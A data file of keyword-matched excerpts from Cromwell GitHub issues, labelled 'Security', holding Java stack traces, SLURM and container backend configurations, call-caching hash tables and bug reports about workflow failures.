java.base/sun.security.provider.certpath.SunCertPathBuilder.build(SunCertPathBuilder.java:148); at java.base/sun.security.provider.certpath.SunCertPathBuilder.engineBuild(SunCertPathBuilder.java:129); at java.base/java.security.cert.CertPathBuilder.build(CertPathBuilder.java:297); at java.base/sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:383); ... 16 common frames omitted. Deadline RPC error example:. Failed to submit job (job-2fd08385-36fe-XXXX-XXXX-cf9e03ae29fe) to GCP, workflowId = 6fd00a65-XXXX-XXXX-84ac-2c0030ba224c; com.google.api.gax.rpc.DeadlineExceededException: io.grpc.StatusRuntimeException: DEADLINE_EXCEEDED: Deadline expired before operation could complete.; ; WorkflowManagerActor: Workflow 415b5011-XXXX-XXXX-953b-68923c164eb0 failed (during ExecutingWorkflowState): cromwell.core.CromwellFatalException: com.google.api.gax.rpc.DeadlineExceede",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7551:8831,secur,security,8831,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7551,1,['secur'],['security']
Security,"nfig. ### The results. The following execution strings can be inserted into the two container configs:; - Singularity: `singularity exec --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${script}`; - udocker: `udocker run ${""--user "" + docker_user} --rm -v ${cwd}:${docker_cwd} ${docker} ${script}`. My _container_ config template for no workflow manager:; ```HOCON; include required(classpath(""application"")). # uncomment if using udocker; # docker.hash-lookup.enabled = false. backend {; default: singularity; providers: {; singularity {; # The backend custom configuration.; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; run-in-background = true; # The list of possible runtime custom attributes.; runtime-attributes = """"""; String? docker; String? docker_user; """"""; # Submit string when there is a ""docker"" runtime attribute.; submit-docker = """"""; ## PLACE THE CORRECT CONTAINER COMMAND HERE ##; """"""; }; }; }; }; ```. And applied for something like SLURM:; ```HOCON; include required(classpath(""application"")). # uncomment if using udocker; # docker.hash-lookup.enabled = false. backend {; default: SLURM; providers: {; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; Int runtime_minutes = 600; Int cpus = 2; Int requested_memory_mb_per_core = 8000; String? queue; String? docker; String? docker_user; """"""; # you should have a submit script as well, ; submit-docker = """"""; sbatch -J ${job_name} -D ${cwd} -o ${cwd}/execution/stdout -e ${cwd}/execution/stderr ${""-p "" + queue} \; -t ${runtime_minutes} ${""-c "" + cpus} --mem-per-cpu=${requested_memory_mb_per_core} \; --wrap ""## PLACE THE CORRECT CONTAINER COMMAND HERE ##""; """"""; kill = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*""; }; }; }; }; ```. Thanks everyone for the comments above. Edit: Correct mistype: `String queue? → String? queue`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461275840:3404,hash,hash-lookup,3404,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461275840,2,['hash'],['hash-lookup']
Security,"ng a workflow that shards into ~5,000 pieces. I am getting the following error: `cromwell-system-akka.dispatchers.backend-dispatcher-150 ERROR - Read timed out`. ```; 2019-04-29 00:02:13,419 cromwell-system-akka.dispatchers.backend-dispatcher-139 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(95b34a77)vcf2bigquery.convertVCF:2058:1]: Status chang; e from Running to Success; 2019-04-29 00:02:24,760 cromwell-system-akka.dispatchers.backend-dispatcher-150 ERROR - Read timed out; java.net.SocketTimeoutException: Read timed out; at java.net.SocketInputStream.socketRead0(Native Method); at java.net.SocketInputStream.socketRead(SocketInputStream.java:116); at java.net.SocketInputStream.read(SocketInputStream.java:171); at java.net.SocketInputStream.read(SocketInputStream.java:141); at sun.security.ssl.InputRecord.readFully(InputRecord.java:465); at sun.security.ssl.InputRecord.read(InputRecord.java:503); at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:975); at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:933); at sun.security.ssl.AppInputStream.read(AppInputStream.java:105); at java.io.BufferedInputStream.fill(BufferedInputStream.java:246); at java.io.BufferedInputStream.read1(BufferedInputStream.java:286); at java.io.BufferedInputStream.read(BufferedInputStream.java:345); at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:735); at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:678); at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1587); at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1492); at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480); at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:347); at com.google.api.client.http.javanet.NetHttpResponse.<init>(NetHttpResponse.java:37); at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:143); a",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4914:1840,secur,security,1840,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4914,1,['secur'],['security']
Security,"ng an HPC environment like our methods users do we'd have to be careful not to store a multiprocess embedded DB on NFS. Today with HSQLDB `mem:` cromwell uses a pair of ephemeral database connection pools. I'm not sure the behavior if both pools are pointed at the same HSQLDB `file:`, but I think it might work as the docs only warn of connecting from multi-process not multi-pool. The default config mentioned in this ticket may still consider using separate `file:` instances just in case. All issues above have workarounds with varying degrees of difficulty and/or documentation warnings. For example one could clarify the documentation with ""Cromwell only supports one instance connecting to the pair of default _file:_ databases at a time."" Or: ""Cromwell only supports call caching when running a workflow with the same name"" because we did something like generate the db file based on the workflow name. Another option, instead of having multiple processes access the same embedded DB, is to research spinning up a background daemon db process, which do support multiple connections. Links to consider when defining acceptance criteria are below. . Re: our existing/proposed HSQLDB usage; - Cromwell's `database.metadata` and `database.engine` when absent both [fall back to the root `database` stanza.](https://github.com/broadinstitute/cromwell/blob/088e12d97dd18f463e6a387a6ffb002d9725cbe4/services/src/main/scala/cromwell/services/ServicesStore.scala#L12); - [""This allows each instance of a database object to use a clean, and different, in memory database.""](https://github.com/broadinstitute/cromwell/blob/a8a605ed1f2f2d2de2db9b05c395a2c87ebfc295/database/sql/src/main/scala/cromwell/database/sql/SqlDatabase.scala#L17-L39); - [""only one Java process at a time can make in-process connections to a given _file:_ database""](http://hsqldb.org/doc/guide/running-chapt.html#rgc_inprocess); - [""Several different programs can connect to the server and retrieve or update information.""](http:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3786#issuecomment-398204194:1734,access,access,1734,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3786#issuecomment-398204194,2,['access'],['access']
Security,"ng contains a `*`. A small test case (run with `/usr/bin/java -jar cromwell-34.jar run -t cwl -i test.yml test.cwl` demonstrates this:; #### test.cwl; ```yaml; #!/usr/bin/env cwl-runner; cwlVersion: v1.0; class: CommandLineTool; requirements:; - class: ShellCommandRequirement; baseCommand: ['/bin/echo', ""this is a""]; arguments: [; { valueFrom: '>', shellQuote: false },; 'some_output.txt'; ]; inputs:; bonus:; type: string; inputBinding:; position: -1; outputs:; found:; type: File; outputBinding:; glob: '*output.txt'; not_found:; type: File?; outputBinding:; glob: '*extra.txt'; ```; #### test.yaml; ```yaml; bonus: ""test""; ```. `cwltool` handles this case as expected:; ```; $ cwltool test.cwl test.yml; /usr/local/bin/cwltool 1.0.20170822192924; Resolved 'test.cwl' to 'file:///home/tmooney/cromwell_test/glob/test.cwl'; [job test.cwl] /tmp/tmpqeLl9_$ /bin/sh \; -c \; '/bin/echo' 'this is a' 'test' > 'some_output.txt'; [job test.cwl] completed success; {; ""found"": {; ""checksum"": ""sha1$6476df3aac780622368173fe6e768a2edc3932c8"", ; ""basename"": ""some_output.txt"", ; ""nameext"": "".txt"", ; ""nameroot"": ""some_output"", ; ""location"": ""file:///home/tmooney/cromwell_test/glob/some_output.txt"", ; ""path"": ""/home/tmooney/cromwell_test/glob/some_output.txt"", ; ""class"": ""File"", ; ""size"": 15; }, ; ""not_found"": null; }; Final process status is success; ```. Cromwell fails with this error:; ```; [2018-08-14 16:14:05,89] [info] MaterializeWorkflowDescriptorActor [a3d3e011]: Parsing workflow as CWL v1.0; [2018-08-14 16:14:07,03] [info] MaterializeWorkflowDescriptorActor [a3d3e011]: Call-to-Backend assignments: test.cwl -> Local; [2018-08-14 16:14:10,44] [info] WorkflowExecutionActor-a3d3e011-3a0c-4203-9edb-3d65564a1d1d [a3d3e011]: Starting test.cwl; [2018-08-14 16:14:11,85] [info] BackgroundConfigAsyncJobExecutionActor [a3d3e011test.cwl:NA:1]: '/bin/echo' 'this is a' 'test' > 'some_output.txt'; [2018-08-14 16:14:11,97] [info] BackgroundConfigAsyncJobExecutionActor [a3d3e011test.cwl:NA:1]: executi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4004:1353,checksum,checksum,1353,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4004,1,['checksum'],['checksum']
Security,ng:hashes:runtime attribute:failOnStderr|68934A3E9455FA72420237EB05902327|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:runtime attribute:failOnStderr|68934A3E9455FA72420237EB05902327|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:runtime attribute:docker|4AD3C387725244C1348F252B031B956D|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:runtime attribute:docker|4AD3C387725244C1348F252B031B956D|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:runtime attribute:continueOnReturnCode|CFCD208495D565EF66E7DFF9F98764DA|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:runtime attribute:continueOnReturnCode|CFCD208495D565EF66E7DFF9F98764DA|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:output expression:File sorted_bam|816FBD6EEA5D806309AA0664E2F2AB86|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:output expression:File sorted_bam|816FBD6EEA5D806309AA0664E2F2AB86|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:output count|C4CA4238A0B923820DCC509A6F75849B|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:output count|C4CA4238A0B923820DCC509A6F75849B|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String sampleRunID|A3F4D40B1A8326642B9C761E2FE16F3E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String sampleRunID|A3F4D40B1A8326642B9C761E2FE16F3E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String sampleGenomicID|5844E24465D27D94BD0D311D5D189FC9|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String sampleGenomicID|5844E24465D27D94BD0D311D5D189FC9|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String runtime_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String runtime_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String runtime_attr:docker|A5281F25296D4311ED0C4642,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:2634,hash,hashes,2634,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['hash'],['hashes']
Security,"nge https://bioinformatics.stackexchange.com/search?q=cromwell; Slack https://join.slack.com/t/cromwellhq/shared_invite/zt-dxmmrtye-JHxwKE53rfKE_ZWdOHIB4g; -->; This is a remark on https://github.com/broadinstitute/cromwell/blob/master/docs/tutorials/HPCSlurmWithLocalScratch.md there is a feature on slum config to edit the sbatch command. You could add in a find and replace in the config to do the same as the tutorial. you can skip the first part of the tutorial by editing the slurm backend config (somewhat hotpatching the scripts on submission time). old submit ; submit = """"""; sbatch -J ${job_name} -D ${cwd} -o ${out} -e ${err} -t ${runtime_minutes} -p ${queue} ${""-c "" +; cpu} --mem ${memory_mb} --wrap ""/bin/bash ${script}""; """""". new submit for slurm auto configured job dir: ; submit = """"""; perl -i.bak -wpe 's/^tmpDir=.*/tmpdir=""\$TMPDIR""/g' ${script} && \; sbatch -J ${job_name} --tmp=${disk} -D ${cwd} -o ${out} -e ${err} -t ${runtime_minutes} -p ${queue} ${""-c "" +; cpu} --mem ${memory_mb} --wrap ""/bin/bash ${script}""; """""". new submit for /genomics/local/ (not tested tough): ; submit = """"""; perl -i.bak -wpe 's/^tmpDir=.*/tmpdir=""$(mkdir -p ""\/genomics_local\/\$PID_\$HOSTNAME""\/"" && echo ""\/genomics_local\/\$PID_\$HOSTNAME""\/""/g' ${script} && \; sbatch -J ${job_name} --tmp=${disk} -D ${cwd} -o ${out} -e ${err} -t ${runtime_minutes} -p ${queue} ${""-c "" +; cpu} --mem ${memory_mb} --wrap ""/bin/bash ${script}""; """""". <!-- Are you seeing something that looks like a bug? Please attach as much information as possible. -->; <!-- This is a clear feature cant you see -->. <!-- Which backend are you running? -->; The backend I'm running on is Slurm hpc with a version 1.0 workflow. This alternative workflow has its downsides but also benefits it is up to the hpc(user) to decide what works best in their own situation. ; <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7357:2154,PASSWORD,PASSWORDS,2154,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7357,1,['PASSWORD'],['PASSWORDS']
Security,nio.CloudStorageWriteChannel.close(CloudStorageWriteChannel.java:57); 	at java.nio.channels.Channels$1.close(Channels.java:178); 	at java.nio.file.Files.write(Files.java:3300); 	at better.files.File.writeByteArray(File.scala:269); 	at better.files.File.write(File.scala:279); 	at cromwell.core.path.BetterFileMethods$class.write(BetterFileMethods.scala:179); 	at cromwell.filesystems.gcs.GcsPath.write(GcsPathBuilder.scala:101); 	at cromwell.engine.io.nio.NioFlow$$anonfun$write$1.apply$mcV$sp(NioFlow.scala:53); 	at cromwell.engine.io.nio.NioFlow$$anonfun$write$1.apply(NioFlow.scala:52); 	at cromwell.engine.io.nio.NioFlow$$anonfun$write$1.apply(NioFlow.scala:52); 	at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24); 	at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24); 	... 6 more; Caused by: javax.net.ssl.SSLException: Connection has been shutdown: javax.net.ssl.SSLException: java.net.SocketException: Broken pipe; 	at sun.security.ssl.SSLSocketImpl.checkEOF(SSLSocketImpl.java:1541); 	at sun.security.ssl.AppInputStream.read(AppInputStream.java:95); 	at java.io.BufferedInputStream.fill(BufferedInputStream.java:246); 	at java.io.BufferedInputStream.read1(BufferedInputStream.java:286); 	at java.io.BufferedInputStream.read(BufferedInputStream.java:345); 	at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:704); 	at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:647); 	at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1536); 	at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1441); 	at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480); 	at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:338); 	at com.google.api.client.http.javanet.NetHttpResponse.<init>(NetHttpResponse.java:37); 	at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:9,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2183:4152,secur,security,4152,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2183,1,['secur'],['security']
Security,"nload.copy_initial_quality_reports,List())WorkflowFailure(wdl.Scope.childGraphNodesSorted(Scope.scala:51),List())WorkflowFailure(wdl.Scope.childGraphNodesSorted$(Scope.scala:42),List())WorkflowFailure(wdl.WdlWorkflow.childGraphNodesSorted$lzycompute(WdlWorkflow.scala:63),List())WorkflowFailure(wdl.WdlWorkflow.childGraphNodesSorted(WdlWorkflow.scala:63),List())WorkflowFailure(wdl.WdlGraphNode$.buildWomGraph(WdlGraphNode.scala:140),List())WorkflowFailure(wdl.WdlWorkflow$.womWorkflowDefinition(WdlWorkflow.scala:52),List())WorkflowFailure(wdl.WdlWorkflow.womDefinition$lzycompute(WdlWorkflow.scala:73),List())WorkflowFailure(wdl.WdlWorkflow.womDefinition(WdlWorkflow.scala:73),List())WorkflowFailure(wdl.WdlInputParsing$.buildWomExecutable(WdlInputParsing.scala:27),List())WorkflowFailure(wdl.WdlNamespaceWithWorkflow.womExecutable(WdlNamespace.scala:97),List())WorkflowFailure(cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.$anonfun$validateWdlNamespace$15(MaterializeWorkflowDescriptorActor.scala:493),List())WorkflowFailure(scala.util.Either.flatMap(Either.scala:338),List())WorkflowFailure(cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.$anonfun$validateWdlNamespace$13(MaterializeWorkflowDescriptorActor.scala:491),List())WorkflowFailure(scala.util.Either.flatMap(Either.scala:338),List())WorkflowFailure(cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.validateWdlNamespace(MaterializeWorkflowDescriptorActor.scala:490),List())WorkflowFailure(cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$lifecycle$materialization$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor(MaterializeWorkflowDescriptorActor.scala:231),List())WorkflowFailure(cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:157),Li",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3176:1337,validat,validateWdlNamespace,1337,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3176,1,['validat'],['validateWdlNamespace']
Security,nner.access$2000(SslHandler.java:1609); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler$SslTasksRunner$2.run(SslHandler.java:1770); at io.grpc.netty.shaded.io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:174); at io.grpc.netty.shaded.io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:167); at io.grpc.netty.shaded.io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470); at io.grpc.netty.shaded.io.netty.channel.epoll.EpollEventLoop.run(EpollEventLoop.java:403); at io.grpc.netty.shaded.io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997); at io.grpc.netty.shaded.io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74); at io.grpc.netty.shaded.io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30); ... 1 common frames omitted; Caused by: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target; at java.base/sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:388); at java.base/sun.security.validator.PKIXValidator.engineValidate(PKIXValidator.java:271); at java.base/sun.security.validator.Validator.validate(Validator.java:256); at java.base/sun.security.ssl.X509TrustManagerImpl.checkTrusted(X509TrustManagerImpl.java:284); at java.base/sun.security.ssl.X509TrustManagerImpl.checkServerTrusted(X509TrustManagerImpl.java:144); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslClientContext$ExtendedTrustManagerVerifyCallback.verify(ReferenceCountedOpenSslClientContext.java:234); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslContext$AbstractCertificateVerifier.verify(ReferenceCountedOpenSslContext.java:779); at io.grpc.netty.shaded.io.netty.internal.tcnative.CertificateVerifierTask.runTask(Cer,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7551:6884,Validat,ValidatorException,6884,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7551,1,['Validat'],['ValidatorException']
Security,"nning with default application.conf. If I abort a running job via POST to the API endpoint `worflows/v1/<uuid>/abort`, this appears in the server logs:. > 2016-05-23 10:21:55,192 cromwell-system-akka.actor.default-dispatcher-6 INFO - CallActor [UUID(87ebf02f):Godot]: Abort function called.; > 2016-05-23 10:21:55,201 cromwell-system-akka.actor.default-dispatcher-5 INFO - WorkflowActor [UUID(87ebf02f)]: Beginning transition from Running to Aborting.; > 2016-05-23 10:21:55,201 cromwell-system-akka.actor.default-dispatcher-5 INFO - WorkflowActor [UUID(87ebf02f)]: transitioning from Running to Aborting.; > 2016-05-23 10:22:00,175 cromwell-system-akka.actor.default-dispatcher-8 INFO - LocalBackend [UUID(87ebf02f):Godot]: Return code: 0; > 2016-05-23 10:22:00,313 cromwell-system-akka.actor.default-dispatcher-2 ERROR - WorkflowActor [UUID(87ebf02f)]: Completion work failed for call Godot.; > java.sql.SQLIntegrityConstraintViolationException: integrity constraint violation: unique constraint or index violation; UK_SYM_WORKFLOW_EXECUTION_ID_SCOPE_NAME_ITERATION_IO table: SYMBOL; > at org.hsqldb.jdbc.JDBCUtil.sqlException(Unknown Source) ~[cromwell-0.19.jar:0.19]; > at org.hsqldb.jdbc.JDBCUtil.sqlException(Unknown Source) ~[cromwell-0.19.jar:0.19]; > at org.hsqldb.jdbc.JDBCPreparedStatement.fetchResult(Unknown Source) ~[cromwell-0.19.jar:0.19]; > at org.hsqldb.jdbc.JDBCPreparedStatement.executeUpdate(Unknown Source) ~[cromwell-0.19.jar:0.19]; > at com.zaxxer.hikari.proxy.PreparedStatementProxy.executeUpdate(PreparedStatementProxy.java:61) ~[cromwell-0.19.jar:0.19]; > at com.zaxxer.hikari.proxy.PreparedStatementJavassistProxy.executeUpdate(PreparedStatementJavassistProxy.java) ~[cromwell-0.19.jar:0.19]; > at slick.driver.JdbcActionComponent$InsertActionComposerImpl$MultiInsertAction$$anonfun$run$8$$anonfun$apply$1.apply(JdbcActionComponent.scala:520) ~[cromwell-0.19.jar:0.19]; > at slick.driver.JdbcActionComponent$InsertActionComposerImpl$MultiInsertAction$$anonfun$run$8$$anonfu",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/869:1015,integrity,integrity,1015,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/869,1,['integrity'],['integrity']
Security,nonfun$startAndRegisterStream$2(DockerInfoActor.scala:163); cromwell_1 | 	at flatMap @ fs2.internal.CompileScope.$anonfun$openAncestor$2(CompileScope.scala:261); cromwell_1 | 	at flatMap @ fs2.internal.FreeC$.$anonfun$compile$17(Algebra.scala:545); cromwell_1 | 	at map @ fs2.internal.CompileScope.$anonfun$close$9(CompileScope.scala:246); cromwell_1 | 	at flatMap @ fs2.internal.CompileScope.$anonfun$close$6(CompileScope.scala:245); cromwell_1 | 	at map @ fs2.internal.CompileScope.fs2$internal$CompileScope$$traverseError(CompileScope.scala:222); cromwell_1 | 	at flatMap @ fs2.internal.CompileScope.$anonfun$close$4(CompileScope.scala:244); cromwell_1 | 	at map @ fs2.internal.CompileScope.fs2$internal$CompileScope$$traverseError(CompileScope.scala:222); cromwell_1 | 2024-01-11 11:09:38 cromwell-system-akka.dispatchers.engine-dispatcher-33 WARN - BackendPreparationActor_for_0845428a:myworkflow.mytask:-1:1 [UUID(0845428a)]: Docker lookup failed; cromwell_1 | java.lang.Exception: Unauthorized to get docker hash eu.gcr.io/project/image_name:tag; cromwell_1 | 	at cromwell.engine.workflow.WorkflowDockerLookupActor.cromwell$engine$workflow$WorkflowDockerLookupActor$$handleLookupFailure(WorkflowDockerLookupActor.scala:279); cromwell_1 | 	at cromwell.engine.workflow.WorkflowDockerLookupActor$$anonfun$3.applyOrElse(WorkflowDockerLookupActor.scala:93); cromwell_1 | 	at cromwell.engine.workflow.WorkflowDockerLookupActor$$anonfun$3.applyOrElse(WorkflowDockerLookupActor.scala:78); cromwell_1 | 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:35); cromwell_1 | 	at akka.actor.FSM.processEvent(FSM.scala:707); cromwell_1 | 	at akka.actor.FSM.processEvent$(FSM.scala:704); cromwell_1 | 	at cromwell.engine.workflow.WorkflowDockerLookupActor.akka$actor$LoggingFSM$$super$processEvent(WorkflowDockerLookupActor.scala:45); cromwell_1 | 	at akka.actor.LoggingFSM.processEvent(FSM.scala:847); cromwell_1 | 	at akka.actor.LoggingFSM.processEvent$(FSM.scala:829); cromwell_,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7356:3704,hash,hash,3704,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7356,1,['hash'],['hash']
Security,"ns since in this case there is no need for a ""?"" in the ```y``` nor the ```x``` or the invokation of ```select_first```; however I have to say that I don't see why this ""coversion"" would be invalid but I'm not much of a wdl or scala expert. Now the for-sure issue here is that instead of failing indicating what is going on the workflow was still running and the offending task(s) were reported as ""Starting"" in the metadata and the timing and they stayed that way forever. . In order to find out what was going on I needed to install and run a locally v36 server (I usually use dsde-method's community cromwell servers). The logs show first the causing wdl bug like so:. ```; [ERROR] [03/19/2019 09:52:14.444] [cromwell-system-akka.dispatchers.engine-dispatcher-47] [akka://cromwell-system ... Could not construct array of type WomMaybeEmptyArrayType(WomOptionalType(WomMaybeEmptyArrayType(WomAnyType))) with this value: List(WomOptionalValue(WomMaybeEmptyArrayType(WomSingleFileType),Some([""gs:// .... 70.tsv.gz""])), []); ```; Notice that Skipped most of the message text showing (what I think are) the important bits . . This meesage is follow for java exception directly dump into the log output file. java.lang.UnsupportedOperationException: Could not construct array of type WomMaybeEmptyArrayType(W....z""])), []); at wom.values.WomArray$.apply(WomArray.scala:34); at wom.values.WomArray$.apply(WomArray.scala:38); at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.$anonfun$evaluateValue$16(LiteralEvaluators.scala:108); at cats.data.Validated.map(Validated.scala:194); ... After this exception there is a log [ERROR] entry appears reporting the exception and exception stack trace. The timing diagram show the tasks hanging in the ""Starting"" state forever and the metadata does not report anything apart than these tasks are ""Starting"". So the error is silenced and the only recurse left is to abort. A re-submit of the workflow would just get stuck in the same place.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4755:2112,Validat,Validated,2112,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4755,2,['Validat'],['Validated']
Security,"ns/main-somatic-giab-mix.cwl/bc4644da-87f9-4765-9791-9011a2fae80f/call-batch_for_variantcall/execution/stderr -t 1-00:00 -p core --cpus-per-task=1 --mem=4026 --wrap ""/usr/bin/env bash /projects/ngs/oncology/dev/bcbio_validation_workflows/somatic-giab-mix/cromwell_work/cromwell-executions/main-somatic-giab-mix.cwl/bc4644da-87f9-4765-9791-9011a2fae80f/call-batch_for_variantcall/execution/script""; [2018-05-02 15:16:57,63] [info] DispatchedConfigAsyncJobExecutionActor [[38;5;2mbc4644da[0mbatch_for_variantcall:NA:1]: job id: 134053; [2018-05-02 15:16:57,66] [info] DispatchedConfigAsyncJobExecutionActor [[38;5;2mbc4644da[0mbatch_for_variantcall:NA:1]: Status change from - to WaitingForReturnCodeFile; [2018-05-02 15:17:05,03] [info] DispatchedConfigAsyncJobExecutionActor [[38;5;2mbc4644da[0mbatch_for_variantcall:NA:1]: Status change from WaitingForReturnCodeFile to Done; [2018-05-02 15:22:54,62] [[38;5;1merror[0m] Failed to hash null; java.io.FileNotFoundException: Cannot hash file null because it can't be found; 	at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.usingStandardInitData$1(ConfigHashingStrategy.scala:46); 	at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.getHash(ConfigHashingStrategy.scala:57); 	at cromwell.backend.impl.sfs.config.ConfigBackendFileHashingActor.customHashStrategy(ConfigBackendFileHashingActor.scala:26); 	at cromwell.backend.standard.callcaching.StandardFileHashingActor$$anonfun$fileHashingReceive$1.applyOrElse(StandardFileHashingActor.scala:79); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at akka.actor.Actor.aroundReceive(Actor.scala:514); 	at akka.actor.Actor.aroundReceive$(Actor.scala:512); 	at cromwell.backend.standard.callcaching.StandardFileHashingActor.akka$actor$Timers$$super$aroundReceive(StandardFileHashingActor.scala:59); 	at akka.actor.Timers.aroundReceive(Timers.scala:44); 	at 